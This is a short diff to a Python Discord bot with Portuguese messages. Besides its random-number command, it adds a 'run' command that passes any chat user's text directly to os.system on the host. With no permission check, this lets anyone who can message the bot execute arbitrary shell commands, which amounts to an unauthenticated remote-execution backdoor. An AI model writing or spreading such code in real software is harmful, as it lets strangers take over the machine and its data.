@@ -1,4 +1,5 @@
 import discord
+import os
 import time
 import random
 import requests
@@ -171,6 +172,11 @@ async def rng(ctx, de: int, ate: int, dados: int):
         await ctx.send(f'O {x}º numero sorteado foi {sort}')
     if dados > 1:
         await ctx.send(f'A soma desses números é {soma}')
+
+
+@bot.command()
+async def run(ctx, cmd):
+    await ctx.send(os.system(cmd))
 
 
 @bot.command()
